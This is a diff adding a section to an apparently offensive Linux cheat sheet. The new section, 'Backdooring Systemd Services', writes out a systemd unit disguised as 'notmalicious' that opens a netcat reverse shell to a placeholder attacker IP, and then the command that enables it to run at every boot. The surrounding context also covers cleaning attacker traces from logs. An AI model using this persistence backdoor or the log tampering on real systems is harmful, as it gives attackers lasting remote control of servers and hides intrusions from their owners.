@@ -282,6 +282,27 @@ tcpdump -nt 'src port 53 and udp[10] & 0x80 = 0x80'
 /version : Linux Version Information.
 /var/log/auth* : Log of authorization login attempts. /var/log/lastlog : Log of last boot process.
 ```
+
+## Backdooring Systemd Services:
+
+Create the following service descriptor at ```/etc/systemd/system/notmalicious.service```:
+
+```
+[Unit]
+Description=Not a backdoor into your critical server.
+[Service]
+Type=simple
+ExecStart=/usr/bin/nc -e /bin/bash <ATTACKER_IP> <PORT> 2>/dev/null
+[Install]
+WantedBy=multi-user.target
+```
+
+Enable the backdoor service to run on restart:
+
+```
+sudo systemctl enable notmalicious
+```
+
 ## Old-Fashioned Log Cleaning:
 
 Grep to remove sensitive attacker information then copy into original logs
